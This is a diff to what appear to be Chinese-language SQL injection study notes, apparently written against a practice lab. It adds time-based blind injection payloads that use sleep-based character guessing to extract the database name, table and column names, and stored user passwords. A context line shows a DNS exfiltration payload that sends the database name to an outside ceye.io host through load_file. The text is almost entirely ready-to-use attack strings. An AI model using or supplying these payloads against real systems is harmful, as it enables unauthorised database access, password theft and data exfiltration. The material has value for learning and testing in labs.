@@ -93,6 +93,14 @@ and if(length(database())=4 , sleep(3), 1) --+ 正确就延迟，错误就不延
                                                   第一个库的前几个
 
 
+?id=1" and if(ascii(substr(database(),1,1))>115,1,sleep(3))--+
+
+?id=1" and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))>101,1,sleep(3))--+
+
+?id=1" and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))>105,1,sleep(3))--+
+
+?id=1" and if(ascii(substr((select password from users limit 0,1),1,1))>68,1,sleep(3))--+
+
 dnslog注入
 
 ?id=1' and if((select load_file(concat('\\\\',(select database()),'.hq87c4.ceye.io\\abc'))),1,0)--+
